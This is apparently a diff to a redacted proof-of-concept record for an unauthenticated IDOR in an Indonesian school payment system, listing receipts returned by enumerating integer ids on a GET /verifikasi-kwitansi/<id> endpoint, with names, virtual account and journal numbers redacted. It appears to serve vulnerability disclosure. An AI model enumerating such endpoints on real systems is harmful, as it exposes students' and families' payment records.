@@ -1,10 +1,13 @@
-# PoC IDOR — GET /verifikasi-kwitansi/<id> (TANPA AUTH) — redacted
-# endpoint mengembalikan kwitansi atm; id integer dapat di-enumerate
+# GET /verifikasi-kwitansi/<id> — TANPA AUTHENTIKASI
+# id integer dapat di-enumerate. id 2,4,5,6,7,8 => kwitansi nyata;
+# id lain => contoh/fallback #INV-000009. Semua PII di-redact.
 
-id=1    #INV-000009 | nama=REDACTED_001 | nis=<REDACTED> | va=<REDACTED> | jurnal=<REDACTED> | Rp 23.700.000 | ll
-id=2    #INV-000002 | nama=REDACTED_002 | nis=None | va=<REDACTED> | jurnal=<REDACTED> | Rp 950.000 | ll
-id=4    #INV-000004 | nama=REDACTED_002 | nis=None | va=<REDACTED> | jurnal=<REDACTED> | Rp 950.000 | ll
-id=5    #INV-000005 | nama=REDACTED_002 | nis=None | va=<REDACTED> | jurnal=None | Rp 950.000 | ll
-id=6    #INV-000006 | nama=REDACTED_002 | nis=None | va=<REDACTED> | jurnal=None | Rp 950.000 | ll
-id=7    #INV-000007 | nama=REDACTED_002 | nis=None | va=<REDACTED> | jurnal=<REDACTED> | Rp 27.200.000 | ll
-id=8    #INV-000008 | nama=REDACTED_001 | nis=<REDACTED> | va=<REDACTED> | jurnal=<REDACTED> | Rp 1.250.000 | ll
+id=2    #INV-000002  | kode=H2H-00000002   | nama=REDACTED_002    | kelas=7          | VA=<REDACTED_VA>     | jurnal=<REDACTED_JURNAL> | Rp 950.000     | -
+id=4    #INV-000004  | kode=H2H-00000004   | nama=REDACTED_002    | kelas=7          | VA=<REDACTED_VA>     | jurnal=<REDACTED_JURNAL> | Rp 950.000     | -
+id=5    #INV-000005  | kode=H2H-00000005   | nama=REDACTED_002    | kelas=7          | VA=<REDACTED_VA>     | jurnal=-                  | Rp 950.000     | -
+id=6    #INV-000006  | kode=H2H-00000006   | nama=REDACTED_002    | kelas=7          | VA=<REDACTED_VA>     | jurnal=-                  | Rp 950.000     | -
+id=7    #INV-000007  | kode=H2H-00000007   | nama=REDACTED_002    | kelas=7          | VA=<REDACTED_VA>     | jurnal=<REDACTED_JURNAL> | Rp 27.200.000  | -
+id=8    #INV-000008  | kode=H2H-00000008   | nama=REDACTED_001 | kelas=<REDACTED_NIS> | VA=<REDACTED_VA>     | jurnal=<REDACTED_JURNAL> | Rp 1.250.000   | -
+id=9    #INV-000009  | kode=H2H-00000009   | nama=REDACTED_001 | kelas=<REDACTED_NIS> | VA=<REDACTED_VA>     | jurnal=<REDACTED_JURNAL> | Rp 23.700.000  | -
+id=50   #INV-000009  | kode=H2H-00000009   | nama=REDACTED_001 | kelas=<REDACTED_NIS> | VA=<REDACTED_VA>     | jurnal=<REDACTED_JURNAL> | Rp 23.700.000  | -
+id=300  #INV-000009  | kode=H2H-00000009   | nama=REDACTED_001 | kelas=<REDACTED_NIS> | VA=<REDACTED_VA>     | jurnal=<REDACTED_JURNAL> | Rp 23.700.000  | -
